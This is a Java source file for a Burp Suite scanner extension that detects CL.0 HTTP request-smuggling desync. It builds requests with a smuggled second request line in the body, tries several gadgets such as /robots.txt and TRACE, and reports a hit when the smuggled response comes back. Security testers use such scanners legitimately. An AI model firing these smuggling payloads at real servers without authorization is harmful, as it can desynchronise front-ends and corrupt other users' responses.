package burp;
import org.apache.commons.lang3.tuple.ImmutablePair;
import org.apache.commons.lang3.tuple.MutablePair;
import org.apache.commons.lang3.tuple.Pair;

import java.util.ArrayList;
import java.util.List;

public class ImplicitZeroScan extends Scan {
    ImplicitZeroScan(String name) {
        super(name);
        scanSettings.importSettings(DesyncBox.sharedSettings);
    }

    @Override
    // fixme before attempting any major work, clean this up!
    List<IScanIssue> doScan(byte[] baseReq, IHttpService service) {
        Utilities.supportsHTTP2 = true;

        if (!"GET".equals(Utilities.getMethod(baseReq))) {
            return null;
        }

        boolean h2 = Utilities.isHTTP2(baseReq);

        baseReq = Utilities.addCacheBuster(baseReq, null);


        byte[] req = SmuggleScanBox.setupRequest(baseReq);
        req = Utilities.replaceFirst(req, "Content-Type: ", "X-Content-Type: ");
        req = Utilities.setMethod(req, "GET");

        if (h2) {
            req = Utilities.replaceFirst(req, " HTTP/2\r\n", " HTTP/1.1\r\n");
            req = Utilities.replaceFirst(req, "Content-Length: ", "X-CL: ");
            req = Utilities.replaceFirst(req, "Connection: ", "X-Connection: ");
        } else {
            req = Utilities.addOrReplaceHeader(req, "Connection", "keep-alive");
        }

        String smuggle = String.format("GET %s HTTP/1.1\r\nX-YzB: ", Utilities.getPathFromRequest(baseReq));
        req = Utilities.fixContentLength(Utilities.setBody(req, smuggle));
        //req = Utilities.addOrReplaceHeader(req, "Content-Length", ""+smuggle.length());
        //req = Utilities.addOrReplaceHeader(req, "Connection", "Content-Length");

        Resp untampered = request(service, baseReq);
        Pair<String, String> gadget = selectGadget(service, req, untampered);

        if (gadget == null) {
            return null;
        }

        int attempts = 9;

        for (int i=0; i<attempts; i++) {
            smuggle = String.format("%s HTTP/1.1\r\nX-YzB: ", gadget.getLeft());
            byte[] attack = Utilities.setBody(req, smuggle);
            attack = Utilities.fixContentLength(attack);

            Resp resp = request(service, attack);
            if (resp.failed()) {
                return null;
            }

            if (Utilities.contains(resp, gadget.getRight())) {
                if ("wrtztrw".equals(gadget.getRight()) && Utilities.contains(resp, "X-YzB") ) {
                    return null;
                }

                report("CL.0 desync: "+i+"/"+gadget.getLeft(), "", baseReq, resp);
                return null;
            }
        }

        return null;
    }

    Pair<String, String> selectGadget(IHttpService service, byte[] req, Resp untampered) {
        Resp baseResp = request(service, req);
        String basePath = "GET "+Utilities.getPathFromRequest(req);
        ArrayList<Pair<String, String>> mappings = new ArrayList<>();
        // remember the response will come from the back-end, so don't use malformed requests
        mappings.add(new ImmutablePair<>("GET /robots.txt", "llow:"));
        mappings.add(new ImmutablePair<>("GET /wrtztrw?wrtztrw=wrtztrw", "wrtztrw"));
        mappings.add(new ImmutablePair<>("GET /favicon.ico", "Content-Type: image/"));
        mappings.add(new ImmutablePair<>("GET /sitemap.xml", "Content-Type: application/xml"));
        mappings.add(new ImmutablePair<>("TRACE /", "405 Method Not Allowed"));
        //mappings.add(new ImmutablePair<>("GET /../", "400 Bad Request"));

        for (Pair<String, String> known: mappings) {
            String knownPath = known.getLeft();
            String knownContent = known.getRight();
            if (knownPath.equals(basePath)) {
                continue;
            }

            if (Utilities.contains(baseResp, knownContent) || Utilities.contains(untampered, knownContent)) {
                continue;
            }

            byte[] attack = Utilities.fixContentLength(Utilities.replaceFirst(req, basePath, knownPath));

            Resp resp = request(service, attack);
            if (resp.failed()) {
                return null;
            }

            if (!Utilities.contains(resp, knownContent)) {
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {

                }
                continue;
            }

            return known;
        }

        return null;
    }

}


